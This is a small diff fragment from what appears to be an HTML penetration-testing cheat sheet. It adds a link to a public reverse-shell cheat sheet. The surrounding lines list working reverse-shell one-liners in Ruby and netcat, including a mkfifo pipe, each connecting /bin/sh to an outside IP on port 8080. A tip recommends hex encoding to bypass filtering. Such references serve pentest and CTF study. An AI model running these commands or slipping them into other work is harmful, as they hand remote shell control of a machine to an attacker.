@@ -266,6 +266,7 @@ ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i
 <b>Netcat</b><br>
 nc -e /bin/sh 10.20.14 8080<br>
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.61.193 8080 >/tmp/f<br>
+<br>More Shell: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener noreferrer">Reverse Shell Cheat Sheet</a>
     </p>
     <br>
     <b>*** Bypass filtering: </b> use hexadecimal code to bypass filtering.
